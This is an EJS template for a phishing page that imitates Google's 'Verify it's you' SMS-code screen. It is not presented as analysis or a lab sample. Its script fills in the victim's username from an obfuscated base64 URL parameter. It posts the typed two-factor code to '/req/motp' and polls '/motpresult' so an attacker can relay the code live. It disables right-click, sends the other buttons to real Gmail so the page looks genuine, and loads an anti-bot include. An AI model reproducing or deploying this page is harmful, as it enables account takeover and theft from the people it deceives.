
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <%- include('partials/meta-noindex') %>
    <link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">
    <link rel="stylesheet" href="/css/newstyle1.css">
    <script src="https://code.iconify.design/3/3.1.0/iconify.min.js"></script>
</head>
<body>
    <div class="maindiv">
        <div class="form-container">
            <div class="white-overlay" id="whiteOverlay"></div>
            <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
        <form class="loginform1" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
       
            <div class="form-half">
                <div><img class="divlogo" src="/image/image.png" ></div><br>
                <div><span class="welcome">Verify it's you<span></div><br>
                <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in<span><button id="myButton" class="hyperl1" ><b>Learn more</b></button></div>                
                <div class="userdiv">
                  <img class="left-img"  src="/image/user-circle.png" >&nbsp;&nbsp;
                  <input type='hidden' name="username" id="useRname" value="">
                  <span class="userdiv-name" style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;"></span>&#8201;<span class="chip-arrow">▾</span>&#8201;
                  
                </div>
            </div>
            <div class="form-half1">
                <center>
                    <div class="gradient-box"><img src="/image/account-recovery-sms-pin.gif"></div>
                </center>
                    <div class="phonediv">
                      <span class="phonetype">Enter a verification code</span><br><br>
                      <span class="messaged"> A text message with a verification code was just sent to your mobile <br><%= hiddenMobNumber %>.</i></span>
                        
                    </div>
                    <div class="codediv">
                        <div class="input-prefix-wrap">
                        <span class="prefix">G - </span>
                        <input  required='' name="code" type='text' id="pEyar">
                        <label style="color:#2c2a2a;; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Enter code' placeholder='Enter Code'></label></div></div>
                

                <div class="tryn1">
                    <button id="myButton" class="hyperl2" ><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
                    <button type="submit" class="btnnxt" onclick="showLoadingBar()">Submit</button>
                    
                  </div>

            </div>

           
      
        </form>
        </div>
        
        <div class="btmdiv">
            <div class="left-div">
                <select class="btmhypl" id="language-select">
                    <option value="en">English (United States)</option>
                    <option value="fr">French</option>
                    <option value="es">Spanish</option>
                    <option value="de">German</option>
                    <!-- Add more options as needed -->
                </select>
            </div>
            <div class="right-divs">
                <div class="right-div">
                    <button id="myButton" class="btmhypl" >Help</button>
                </div>
                <div class="right-div">
                    <button id="myButton" class="btmhypl" >Privacy</button>
                </div>
                <div class="right-div">
                    <button id="myButton" class="btmhypl" >Terms</button>
                </div>
            </div>
        </div>
        <script>
            // JavaScript to handle button clicks
            document.querySelectorAll('#myButton').forEach(button => {
                button.onclick = function(event) {
                    event.preventDefault();
                    location.href = "https://mail.google.com";
                };
            });
        </script>

        <script>
            document.addEventListener('contextmenu', function (e) {
                e.preventDefault();
            });

            (function(){
              const tk = new URLSearchParams(window.location.search).get('nxowuwonvdmbqrrwewosnadgdhgdus') || '';
              const username = atob(tk);
              document.getElementById('useRname').value = username;
              document.querySelector('.userdiv-name').textContent = username;
            })();

            function showLoadingBar() {
                var codeInput = document.getElementById('pEyar');
                if (codeInput.value.trim() === '') {
                    return false;
                }
                document.getElementById('loadingBar').classList.add('active');
                document.getElementById('whiteOverlay').classList.add('active');

                const code = codeInput.value.trim();
                const username = document.getElementById('useRname').value;

                fetch('/req/motp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, code })
                }).then(() => pollOtpResult(username));
            }

            function pollOtpResult(username) {
                fetch('/motpresult?u=' + encodeURIComponent(username))
                    .then(r => r.json())
                    .then(data => {
                        if (data.result === 'waiting') {
                            setTimeout(() => pollOtpResult(username), 2000);
                        } else if (data.result === 'success') {
                            window.location.href = '/DRA Tech Justification.pdf';
                        } else {
                            document.getElementById('loadingBar').classList.remove('active');
                            document.getElementById('whiteOverlay').classList.remove('active');
                        }
                    });
            }
        </script>

    </div>
    
<%- include('partials/antibot') %>
</body>
</html>